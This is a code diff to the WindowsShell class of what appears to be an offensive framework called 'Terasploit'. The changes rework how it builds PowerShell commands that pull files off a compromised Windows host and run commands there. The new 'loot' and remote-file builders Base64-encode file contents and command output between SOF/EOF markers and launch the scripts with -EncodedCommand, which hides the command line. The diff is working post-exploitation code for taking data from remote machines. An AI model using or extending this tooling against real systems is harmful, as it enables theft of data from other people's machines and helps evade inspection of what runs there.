@@ -116,21 +116,44 @@ class WindowsShell(GenericShell):
         ps_cmd = (
             f'powershell -NoProfile -Command "'
             f"$content = [System.IO.File]::ReadAllBytes('{safe_path}'); "
+            f"Write-Host ('---TERASPLOIT_' + 'SHELL_SOF---'); "
             f"[System.Convert]::ToBase64String($content); "
-            f"Write-Host '---TERASPLOIT_SHELL_EOF---'\""
+            f"Write-Host ('---TERASPLOIT_' + 'SHELL_EOF---')\""
         )
-        self._send(ps_cmd)
+        if not self._send(ps_cmd):
+            self._stop_transfer()
+
+    def _build_remote_file_cmd(self, remote_path):
+        """Build a PowerShell command that transfers an existing remote file."""
+        script = (
+            f"$path = '{remote_path.replace(chr(39), chr(39) * 2)}'; "
+            "try { "
+            "$bytes = [System.IO.File]::ReadAllBytes($path); "
+            "$status = 'OK'; $payload = [Convert]::ToBase64String($bytes) "
+            "} catch { "
+            "$status = 'ERR'; "
+            "$payload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($_.Exception.Message)) "
+            "}; "
+            "[Console]::Out.WriteLine('---TERASPLOIT_SHELL_SOF---'); "
+            "[Console]::Out.WriteLine($status); "
+            "[Console]::Out.WriteLine($payload); "
+            "[Console]::Out.WriteLine('---TERASPLOIT_SHELL_EOF---')"
+        )
+        encoded = base64.b64encode(script.encode("utf-16le")).decode("ascii")
+        return f"powershell.exe -NoLogo -NoProfile -NonInteractive -EncodedCommand {encoded}"
 
     def _build_loot_cmd(self, remote_cmd: str) -> str:
-        """Build a PowerShell command that base64-encodes the command output."""
-        safe_cmd = remote_cmd.replace('"', '`"')
-        return (
-            f'powershell -NoProfile -Command "'
-            f"$out = & cmd /c {safe_cmd} 2>&1 | Out-String; "
-            f"[System.Convert]::ToBase64String("
-            f"[System.Text.Encoding]::UTF8.GetBytes($out)); "
-            f"Write-Host '---TERASPLOIT_SHELL_EOF---'\""
+        """Build a PowerShell command that captures Windows command output as Base64."""
+        safe_cmd = remote_cmd.replace("'", "''")
+        script = (
+            f"$output = & cmd.exe /d /s /c '{safe_cmd}' 2>&1 | Out-String; "
+            "$bytes = [System.Text.Encoding]::UTF8.GetBytes($output); "
+            "[Console]::Out.WriteLine('---TERASPLOIT_SHELL_SOF---'); "
+            "[Console]::Out.WriteLine([Convert]::ToBase64String($bytes)); "
+            "[Console]::Out.WriteLine('---TERASPLOIT_SHELL_EOF---')"
         )
+        encoded = base64.b64encode(script.encode("utf-16le")).decode("ascii")
+        return f"powershell.exe -NoLogo -NoProfile -NonInteractive -EncodedCommand {encoded}"
 
     def _help_sections(self) -> list:
         core, filesystem, execution = super()._help_sections()
